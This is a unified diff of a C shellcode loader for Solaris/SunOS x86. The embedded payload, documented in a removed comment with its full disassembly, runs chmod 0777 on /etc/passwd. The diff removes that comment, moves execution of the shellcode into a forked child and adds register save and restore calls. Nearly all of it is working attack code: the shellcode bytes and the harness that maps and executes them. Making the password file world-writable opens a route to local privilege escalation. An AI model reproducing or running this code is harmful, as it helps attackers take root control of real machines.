@@ -5,62 +5,11 @@
 #include <strings.h>
 #endif
 
+#include <sys/types.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
-
-/*
- * SunOS (Solaris) / x86 '/usr/bin/chmod 0777 /etc/passwd' 77 bytes shellcode
- *
- * Paulus Gandung Prakosa <gandung@lists.infradead.org>
- *
- * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
- *
- * Disassembly of section .text:
- *
- * 08050428 <_start>:
- * 8050428:       33 f6                   xor    %esi,%esi
- * 805042a:       56                      push   %esi
- * 805042b:       68 73 73 77 64          push   $0x64777373
- * 8050430:       68 63 2f 70 61          push   $0x61702f63
- * 8050435:       68 2f 2f 65 74          push   $0x74652f2f
- * 805043a:       8b dc                   mov    %esp,%ebx
- * 805043c:       33 c9                   xor    %ecx,%ecx
- * 805043e:       41                      inc    %ecx
- * 805043f:       41                      inc    %ecx
- * 8050440:       ba ff ff ff ff          mov    $0xffffffff,%edx
- * 8050445:       33 c0                   xor    %eax,%eax
- * 8050447:       b0 44                   mov    $0x44,%al
- * 8050449:       56                      push   %esi
- * 805044a:       51                      push   %ecx
- * 805044b:       53                      push   %ebx
- * 805044c:       52                      push   %edx
- * 805044d:       50                      push   %eax
- * 805044e:       cd 91                   int    $0x91
- * 8050450:       8b f8                   mov    %eax,%edi
- * 8050452:       33 c9                   xor    %ecx,%ecx
- * 8050454:       66 b9 ff 01             mov    $0x1ff,%cx
- * 8050458:       56                      push   %esi
- * 8050459:       56                      push   %esi
- * 805045a:       51                      push   %ecx
- * 805045b:       53                      push   %ebx
- * 805045c:       57                      push   %edi
- * 805045d:       33 c0                   xor    %eax,%eax
- * 805045f:       b0 65                   mov    $0x65,%al
- * 8050461:       50                      push   %eax
- * 8050462:       cd 91                   int    $0x91
- * 8050464:       56                      push   %esi
- * 8050465:       57                      push   %edi
- * 8050466:       33 c0                   xor    %eax,%eax
- * 8050468:       b0 06                   mov    $0x6,%al
- * 805046a:       50                      push   %eax
- * 805046b:       cd 91                   int    $0x91
- * 805046d:       56                      push   %esi
- * 805046e:       56                      push   %esi
- * 805046f:       33 c0                   xor    %eax,%eax
- * 8050471:       b0 01                   mov    $0x1,%al
- * 8050473:       cd 91                   int    $0x91
- */
 
 #ifndef unused
 #define unused(x) ((void)(x))
@@ -70,6 +19,8 @@ int main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
+  int ret, wstatus;
+  pid_t pid;
   struct utsname uts;
   char *pcall;
   char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
@@ -88,15 +39,15 @@ int main(int argc, char **argv) {
 
   if (pcall == MAP_FAILED) {
     perror("mmap()");
-    return -1;
+    ret = -1;
+    goto __fallback;
   }
 
   bzero(&uts, sizeof(struct utsname));
 
-  if (uname(&uts) < 0) {
+  if ((ret = uname(&uts)) < 0) {
     perror("uname()");
-    munmap(pcall, sysconf(_SC_PAGESIZE));
-    return -1;
+    goto __must_unmap;
   }
 
   printf("[*] Machine info\n");
@@ -109,11 +60,35 @@ int main(int argc, char **argv) {
   printf("[*] Copying shellcode into crafted buffer.\n");
   memcpy(pcall, shellcode, strlen(shellcode));
 
-  printf("[*] Executing the shellcode..\n");
-  __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
+
+  pid = fork();
+
+  if (pid < 0) {
+    perror("fork()");
+    ret = pid;
+    goto __must_unmap;
+  }
+
+  if (!pid) {
+    printf("[*] Executing the shellcode..\n");
+    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
+  } else {
+    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
+  }
+
+  printf("[*] Restoring register state..\n");
+  store_regs(&__serialize_regs(cregs));
 
   printf("[*] Cleaning up..\n");
   munmap(pcall, sysconf(_SC_PAGESIZE));
 
   return 0;
+
+__must_unmap:
+  munmap(pcall, sysconf(_SC_PAGESIZE));
+
+__fallback:
+  return ret;
 }
